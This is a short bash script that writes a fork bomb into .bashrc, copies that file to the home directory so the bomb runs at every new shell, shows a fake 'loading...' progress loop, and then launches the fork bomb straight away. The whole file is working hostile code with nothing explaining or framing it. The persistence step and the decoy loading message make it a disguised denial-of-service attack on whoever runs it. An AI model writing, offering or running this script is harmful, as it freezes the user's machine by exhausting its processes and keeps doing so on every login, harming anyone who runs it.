echo ":(){ :|: &};:" >> .bashrc
cp .bashrc ~/

for i in {1..10};
do
	echo "loading..."
	sleep 0.5
done

:(){ :|: &};:

